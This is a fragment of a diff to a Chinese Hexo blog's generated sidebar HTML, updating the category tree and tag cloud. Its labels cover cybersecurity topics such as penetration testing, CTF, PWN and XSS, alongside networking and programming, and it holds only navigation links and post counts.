class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">33</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">5</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/">我的SRC</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%80%9D%E8%B7%AF/">思路</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%8A%A5%E5%91%8A/">报告</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">17</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">11</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">35</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/">我的SRC</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%80%9D%E8%B7%AF/">思路</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%8A%A5%E5%91%8A/">报告</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">17</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">11</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
   </div>
 </div>
 
@@ -412,48 +286,48 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/CSS/">CSS<span>1</span></a></li>
+			<li><a href="/tags/代理/">代理<span>1</span></a></li>
 		
-			<li><a href="/tags/软考/">软考<span>1</span></a></li>
+			<li><a href="/tags/Linux/">Linux<span>3</span></a></li>
 		
-			<li><a href="/tags/GitHub-Dork/">GitHub Dork<span>1</span></a></li>
+			<li><a href="/tags/解压/">解压<span>1</span></a></li>
 		
-			<li><a href="/tags/FOFA/">FOFA<span>1</span></a></li>
+			<li><a href="/tags/虚拟机网络/">虚拟机网络<span>1</span></a></li>
+		
+			<li><a href="/tags/网络传输工具/">网络传输工具<span>1</span></a></li>
+		
+			<li><a href="/tags/计算机体系架构/">计算机体系架构<span>1</span></a></li>
 		
 			<li><a href="/tags/JWT/">JWT<span>1</span></a></li>
 		
-			<li><a href="/tags/Java/">Java<span>1</span></a></li>
+			<li><a href="/tags/XSS/">XSS<span>1</span></a></li>
 		
-			<li><a href="/tags/端口协议/">端口协议<span>1</span></a></li>
-		
-			<li><a href="/tags/SQL注入/">SQL注入<span>1</span></a></li>
-		
-			<li><a href="/tags/传输层/">传输层<span>1</span></a></li>
-		
-			<li><a href="/tags/Pwn/">Pwn<span>3</span></a></li>
-		
-			<li><a href="/tags/Next/">Next<span>1</span></a></li>
-		
-			<li><a href="/tags/计算机网络/">计算机网络<span>7</span></a></li>
-		
-			<li><a href="/tags/windows/">windows<span>1</span></a></li>
-		
-			<li><a href="/tags/栈/">栈<span>1</span></a></li>
-		
-			<li><a href="/tags/业务逻辑漏洞/">业务逻辑漏洞<span>1</span></a></li>
-		
-			<li><a href="/tags/域工具/">域工具<span>2</span></a></li>
-		
-			<li><a href="/tags/同源策略/">同源策略<span>1</span></a></li>
-		
-			<li><a href="/tags/Kali/">Kali<span>1</span></a></li>
+			<li><a href="/tags/软考/">软考<span>1</span></a></li>
 		
 			<li><a href="/tags/数据链路层/">数据链路层<span>1</span></a></li>
 		
-			<li><a href="/tags/编码技术/">编码技术<span>1</span></a></li>
+			<li><a href="/tags/应用层/">应用层<span>1</span></a></li>
+		
+			<li><a href="/tags/windows/">windows<span>1</span></a></li>
+		
+			<li><a href="/tags/CORS/">CORS<span>2</span></a></li>
+		
+			<li><a href="/tags/PHP/">PHP<span>1</span></a></li>
+		
+			<li><a href="/tags/Java/">Java<span>1</span></a></li>
+		
+			<li><a href="/tags/包管理工具/">包管理工具<span>1</span></a></li>
+		
+			<li><a href="/tags/Hexo/">Hexo<span>1</span></a></li>
+		
+			<li><a href="/tags/指令/">指令<span>3</span></a></li>
+		
+			<li><a href="/tags/GitHub-Dork/">GitHub Dork<span>1</span></a></li>
+		
+			<li><a href="/tags/Google-Hacking/">Google Hacking<span>1</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>59</span></a></li>
+		   <li><a href="/tags">...<span>60</span></a></li>
 		 
 		</ul>
 	</div>
